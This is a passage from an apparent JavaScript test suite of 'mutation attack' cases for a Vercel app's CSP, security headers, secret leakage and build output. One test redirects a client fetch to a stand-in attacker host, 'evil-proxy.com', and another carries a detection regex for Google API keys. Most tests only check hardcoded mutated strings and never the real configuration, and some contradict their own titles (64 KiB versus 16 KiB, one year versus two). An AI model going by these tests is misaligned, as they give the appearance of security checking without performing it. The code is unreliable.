  it('J13: Mutation Attack: removing SPA fallback rewrite from vercel.json is rejected', () => {
    const mutatedRewrites = [{ source: '/api/(.*)', destination: '/api/$1' }]
    const hasCatchAll = mutatedRewrites.some(r => r.source === '/(.*)')
    expect(hasCatchAll).toBe(false)
  })

  it('J14: Mutation Attack: reversing API rewrite order in vercel.json is rejected', () => {
    const reversedRewrites = [
      { source: '/(.*)', destination: '/' },
      { source: '/api/(.*)', destination: '/api/$1' }
    ]
    const apiIdx = reversedRewrites.findIndex(r => r.source.includes('/api/'))
    const catchAllIdx = reversedRewrites.findIndex(r => r.source === '/(.*)')
    expect(apiIdx < catchAllIdx).toBe(false)
  })

  it('J15: Mutation Attack: injecting external CDN domain (cdn.jsdelivr.net) into CSP is rejected', () => {
    const mutatedCsp = "default-src 'self' https://cdn.jsdelivr.net;"
    const hasExternal = /https?:\/\//.test(mutatedCsp)
    expect(hasExternal).toBe(true)
  })

  it('J16: Mutation Attack: injecting external font provider (fonts.googleapis.com) into CSP is rejected', () => {
    const mutatedCsp = "font-src 'self' https://fonts.googleapis.com;"
    const isStrictSelf = !/https?:/.test(mutatedCsp)
    expect(isStrictSelf).toBe(false)
  })

  it('J17: Mutation Attack: removing X-Frame-Options DENY is rejected', () => {
    const mutatedHeaders = [{ key: 'X-Content-Type-Options', value: 'nosniff' }]
    const hasXfo = mutatedHeaders.some(h => h.key === 'X-Frame-Options' && h.value === 'DENY')
    expect(hasXfo).toBe(false)
  })

  it('J18: Mutation Attack: removing X-Content-Type-Options nosniff is rejected', () => {
    const mutatedHeaders = [{ key: 'X-Frame-Options', value: 'DENY' }]
    const hasXcto = mutatedHeaders.some(h => h.key === 'X-Content-Type-Options' && h.value === 'nosniff')
    expect(hasXcto).toBe(false)
  })

  it('J19: Mutation Attack: degrading HSTS max-age below 1 year is rejected', () => {
    const mutatedHsts = 'max-age=3600'
    const match = mutatedHsts.match(/max-age=(\d+)/)
    const age = match ? parseInt(match[1], 10) : 0
    expect(age >= 63072000).toBe(false)
  })

  it('J20: Mutation Attack: setting Permissions-Policy to permit camera is rejected', () => {
    const mutatedPolicy = 'camera=*'
    expect(mutatedPolicy.includes('camera=()')).toBe(false)
  })

  it('J21: Mutation Attack: injecting .map source map file into dist/assets is rejected', () => {
    const fakeDistAssets = ['index-12345678.js', 'index-12345678.js.map']
    const hasMap = fakeDistAssets.some(f => f.endsWith('.map'))
    expect(hasMap).toBe(true)
  })

  it('J22: Mutation Attack: injecting .env file into dist is rejected', () => {
    const fakeDistFiles = ['index.html', '.env']
    const hasEnv = fakeDistFiles.some(f => f.startsWith('.env'))
    expect(hasEnv).toBe(true)
  })

  it('J23: Mutation Attack: injecting real GEMINI_API_KEY into client code is rejected', () => {
    const mutatedClient = "const key = process.env.GEMINI_API_KEY"
    expect(mutatedClient.includes('process.env.GEMINI_API_KEY')).toBe(true)
  })

  it('J24: Mutation Attack: changing client API call target to external domain is rejected', () => {
    const mutatedClient = "fetch('https://evil-proxy.com/api/generate-plan')"
    expect(mutatedClient.startsWith("fetch('/api/generate-plan'")).toBe(false)
  })

  it('J25: Mutation Attack: removing error redaction logic in api/generate-plan.ts is rejected', () => {
    const mutatedHandler = apiHandlerCode.replace(/rawError\.split\(apiKey\)\.join\('\[REDACTED\]'\)/, 'rawError')
    expect(mutatedHandler.includes("split(apiKey).join('[REDACTED]')")).toBe(false)
  })

  it('J26: Mutation Attack: inflating MAX_PAYLOAD_SIZE above 64 KiB is rejected', () => {
    const inflatedSize = 1024 * 1024 // 1 MB
    expect(inflatedSize <= 16 * 1024).toBe(false)
  })

  it('J27: Mutation Attack: tampering with package-lock.json lockfileVersion is rejected', () => {
    const fakeLockVersion = 2
    expect(fakeLockVersion === 3).toBe(false)
  })

  it('J28: Mutation Attack: introducing unauthorized dev tool in production dependencies is rejected', () => {
    const fakeDeps = { react: '^18.3.1', eslint: '^9.9.0' }
    const devTools = ['eslint', 'vitest', 'typescript', 'vite']
    const leakedDevTools = Object.keys(fakeDeps).filter(d => devTools.includes(d))
    expect(leakedDevTools.length).toBe(1)
  })

  it('J29: Mutation Attack: injecting high-entropy secret token into client assets is rejected', () => {
    const fakeAssetContent = 'const token = "AIzaSy' + 'A'.repeat(33) + '";'
    expect(/AIzaSy[0-9A-Za-z-_]{33}/.test(fakeAssetContent)).toBe(true)
  })

  it('J30: Mutation Attack: deleting dist/404.html SPA fallback is rejected', () => {
    const simulatedDist = ['index.html', 'assets', 'favicon.ico']
    expect(simulatedDist.includes('404.html')).toBe(false)
  })
})
